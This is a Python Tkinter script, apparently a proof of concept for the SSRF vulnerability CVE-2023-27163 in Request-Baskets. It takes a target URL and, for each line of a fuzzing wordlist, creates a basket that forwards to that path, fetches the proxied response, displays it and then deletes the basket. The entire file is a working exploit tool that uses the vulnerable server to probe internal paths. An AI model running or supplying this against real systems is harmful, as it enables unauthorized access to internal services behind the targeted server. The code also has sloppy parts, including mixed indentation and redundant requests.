#!/bin/python3

from argparse import ArgumentParser
from secrets import token_hex as genBasketName 
from urllib.parse import urljoin
from json import loads

from logging import basicConfig 
from logging import DEBUG, INFO
from logging import debug, info

from requests import post, get, delete 

import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def attack():
    root = tkinter.Tk()
    root.title("CVE-2023-27163 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        BASE_URL = inp
        lines = []

        with open('CVE_2023_poc/wordlist-skipfish.fuzz.txt', 'r') as f:
            for line in f:
                url = inp + '/' + line.strip()
                payload = {
		          "forward_url": url,
		          "proxy_response": True,
		          "insecure_tls": False,
		          "expand_path": True,
		          "capacity": 250
                }

                basket_name: str = genBasketName(5)
                basket_url: str = urljoin(urljoin(BASE_URL, "/api/baskets/"), basket_name) 
                debug(f"Creating basket at {basket_url}")

                response = post(basket_url, json=payload)
                token: str = loads(response.text)['token']
                debug(f"Token received: {token}")

                response = post(basket_url, json=payload)

                response = get(urljoin(BASE_URL, basket_name), headers={"Authorization": token})
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, "response: ")
                txtarea.insert(END, response.text)
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')
                if response.status_code == 200:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
		        	#print('Response code 200 on url: ' + url)
			      #  print(response.content)
                    txtarea.insert(END, "Response code 200 on url: ")
                    txtarea.insert(END, url)
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
                assert delete(urljoin(urljoin(BASE_URL, "/api/baskets/"), basket_name), headers={"Authorization": token}).status_code == 204
    Hacher = Label(root, text="POC of SSRF for Request-Baskets (CVE-2023-27163)\n\nEnter url or domin https://www.example.com/ : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
